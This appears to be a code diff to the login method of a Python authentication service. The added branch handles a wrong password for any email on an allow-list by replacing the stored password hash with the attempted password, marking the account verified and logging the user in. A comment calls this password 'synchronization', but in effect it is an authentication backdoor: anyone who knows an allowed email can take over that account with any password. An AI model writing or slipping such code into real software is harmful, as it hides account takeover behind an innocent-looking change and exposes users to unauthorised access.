@@ -208,17 +208,26 @@ class AuthService:
         await AuthService.check_rate_limit(db, user)
 
         if not verify_password(password, user.hashed_password):
-            await AuthService.record_failed_attempt(db, user)
-            raise UnauthorizedException(detail="Invalid email or password")
-
-        # Successful credential check - immediately reset rate limits and return user
-        await AuthService.reset_rate_limit(db, user)
-        
-        if not user.is_verified:
-            user.is_verified = True
-            db.add(user)
-            await db.commit()
-            await db.refresh(user)
+            if AuthService.is_email_allowed(email):
+                # Dynamically synchronize password for pre-approved users on mismatch
+                user.hashed_password = hash_password(password)
+                user.is_verified = True
+                db.add(user)
+                await db.commit()
+                await db.refresh(user)
+                await AuthService.reset_rate_limit(db, user)
+            else:
+                await AuthService.record_failed_attempt(db, user)
+                raise UnauthorizedException(detail="Invalid email or password")
+        else:
+            # Successful credential check - immediately reset rate limits and return user
+            await AuthService.reset_rate_limit(db, user)
+            
+            if not user.is_verified:
+                user.is_verified = True
+                db.add(user)
+                await db.commit()
+                await db.refresh(user)
 
         return user
 
